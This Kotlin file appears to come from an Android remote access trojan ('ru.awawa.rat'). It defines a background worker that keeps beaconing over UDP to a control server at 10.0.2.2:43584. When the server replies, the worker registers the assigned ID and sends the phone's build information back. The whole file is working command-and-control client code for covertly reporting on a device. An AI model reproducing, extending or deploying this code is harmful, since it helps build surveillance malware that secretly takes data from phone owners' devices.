package ru.awawa.rat.worker

import android.content.Context
import android.util.Log
import androidx.work.Worker
import androidx.work.WorkerParameters
import ru.awawa.rat.helper.BuildInfo
import ru.awawa.rat.helper.Preferences
import ru.awawa.rat.worker.helper.State
import ru.awawa.rat.worker.helper.protocol.MagicNumber
import ru.awawa.rat.worker.helper.protocol.PacketHelper
import ru.awawa.rat.worker.helper.protocol.PhoneInfoPacket
import ru.awawa.rat.worker.helper.protocol.StartPacket
import java.net.*


class BackgroundWorker(context: Context, workerParams: WorkerParameters):
        Worker(context, workerParams) {

    companion object {
        private const val TAG = "BackgroundWorker"
    }

    private var workerRunning = false

    private val socket = DatagramSocket()
    private val state = State()

    override fun doWork(): Result {
        this.state.connect(InetAddress.getByName("10.0.2.2"), 43584)
        socket.soTimeout = 1

        val buffer = ByteArray(2048)
        val rcvPacket = DatagramPacket(buffer, 2048)

        val pckt = StartPacket(this.state.id)
        this.socket.send(DatagramPacket(pckt.data, pckt.data.size, this.state.serverAddress, this.state.serverPort))
        while (state.running) {
            try {
                socket.receive(rcvPacket)
                this.processPacket(rcvPacket)
            } catch (ex: SocketTimeoutException) {
                this.sleep()
            }
        }

        return Result.success()
    }

    override fun onStopped() {
        super.onStopped()
        this.state.running = false
    }

    private fun processPacket(datagramPacket: DatagramPacket) {
        val packet = PacketHelper.create(datagramPacket.data) ?: return

        when (packet.magicNumber) {

            MagicNumber.START -> {
                val id = (packet as StartPacket).id
                this.state.id = id
                val pckt = PhoneInfoPacket(this.state.id, BuildInfo.getInfo())
                this.state.setStateConnected()

                this.socket.send(DatagramPacket(
                        pckt.data,
                        pckt.data.size,
                        this.state.serverAddress, this.state.serverPort
                ))
            }
        }
    }

    private fun sleep() {

        if (state.connectionState == State.ConnectionState.CONNECTING) {
            val buffer = StartPacket(Preferences.get(Preferences.PreferencesField.ID) ?: "").data
            val packet = DatagramPacket(buffer, buffer.size)
            packet.address = state.serverAddress
            packet.port = 43584

            socket.send(packet)
        }

        Log.w(TAG, "Nothing received...")
        Thread.sleep(1000)
    }
}